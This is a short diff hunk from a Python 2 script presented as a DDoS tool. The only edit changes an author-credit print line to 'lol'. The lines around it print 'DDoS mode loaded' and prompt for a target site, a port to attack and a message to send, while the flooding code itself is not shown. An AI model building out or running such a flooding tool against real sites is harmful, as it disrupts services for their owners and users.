@@ -15,7 +15,7 @@ curdir = os.getcwd()
 #~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~#
  
 print ("DDoS mode loaded")
-print ("python script made by FancyDuck")
+print ("lol")
 host=raw_input( "Site you want to DDoS:" )
 port=input( "Port you want to attack:" )
 message=raw_input( "Input the message you want to send:" )
